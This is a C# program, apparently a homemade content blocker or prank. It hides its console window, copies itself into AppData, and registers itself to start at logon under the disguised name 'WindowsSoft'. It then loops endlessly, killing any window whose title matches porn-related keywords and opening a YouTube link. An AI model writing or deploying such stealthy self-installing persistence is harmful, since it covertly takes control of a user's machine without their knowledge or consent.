using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace ConsoleApp3
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public static string[] PornServices = new string[] {
            "porn", "sex", "hentai", "porno", "sex","xxx","xnxx","hamster","omegle"
        };
        static void Main(string[] args)
        {
            IntPtr hWnd = GetConsoleWindow();
            ShowWindow(hWnd, 0);

            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string cDirectory = Environment.CurrentDirectory;
            string ePath = Process.GetCurrentProcess().MainModule.FileName;
            if (appdata != cDirectory)
            {
                File.Copy(ePath, appdata + "\\nocumtoday.exe", true);
                Directory.SetCurrentDirectory(appdata);
                System.Diagnostics.Process.Start("nocumtoday.exe");

                AddStartup("WindowsSoft", appdata + "\\nocumtoday.exe");
                Thread.Sleep(5000);
            }

            while (true)
            {
                Detect();
            }
        }
        public static void Detect()
        {
            Process[] processlist = Process.GetProcesses();
            foreach (Process process in processlist)
            {
                if (!String.IsNullOrEmpty(process.MainWindowTitle))
                {
                    //string sites = PornServices[1];
                    if (PornServices.Any(process.MainWindowTitle.Contains))
                    {
                        process.Kill();
                        System.Diagnostics.Process.Start("https://www.youtube.com/watch?v=lrHsahy4GIg");
                        //Console.WriteLine(process.MainWindowTitle);
                    }

                }
            }
        }
        public static void AddStartup(string appName, string path)
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
            {
                key.SetValue(appName, "\"" + path + "\"");
            }
        }

    }
}
